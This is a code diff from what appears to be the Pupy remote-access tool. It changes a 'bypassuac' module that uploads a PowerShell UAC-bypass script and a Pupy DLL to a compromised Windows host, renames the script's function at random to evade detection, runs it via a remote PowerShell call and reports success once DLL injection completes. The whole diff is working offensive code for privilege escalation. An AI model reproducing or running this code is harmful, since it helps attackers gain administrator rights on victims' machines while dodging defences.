@@ -9,10 +9,11 @@ from rpyc.utils.classic import upload
 import base64
 from tempfile import gettempdir, _get_candidate_names
 import subprocess
-from modules.lib.windows.powershell_upload import execute_powershell_script
 import re, time
 import random, string
 from pupylib.utils.rpyc_utils import redirected_stdo
+
+ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
 
 class bypassuac():
 
@@ -90,12 +91,25 @@ class bypassuac():
         self.module.info('Uploading temporary files')
         self.uploadPowershellScripts()
         self.uploadPupyDLL()
-        content = re.sub("Write-Verbose ","Write-Output ", open(self.invokeBypassUACLocalPath, 'r').read(), flags=re.I)
-        content = re.sub("Invoke-BypassUAC", self.bypassUAC_random_name, content, flags=re.I)
+
+        content = ''
+        with open(self.invokeBypassUACLocalPath) as script:
+            content = script.read()
+
+        content = re.sub('Write-Verbose ', 'Write-Output ', content, flags=re.I)
+        content = re.sub('Invoke-BypassUAC', self.bypassUAC_random_name, content, flags=re.I)
+
         logging.debug("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
         self.module.info('Starting the UAC Bypass process')
-        output = execute_powershell_script(self.module, content, bypassUACcmd, x64IfPossible=True)
-        logging.debug("BypassUAC script output: %s\n"%(output))
+
+        powershell = self.module.client.conn.modules['powershell']
+
+        output, rest = powershell.call('bypassuac', bypassUACcmd, content=content, try_x64=True)
+        if output:
+            self.module.log(output)
+
+        if rest:
+            self.module.error(rest)
 
         if "DLL injection complete!" in output:
             self.module.success("UAC bypassed")
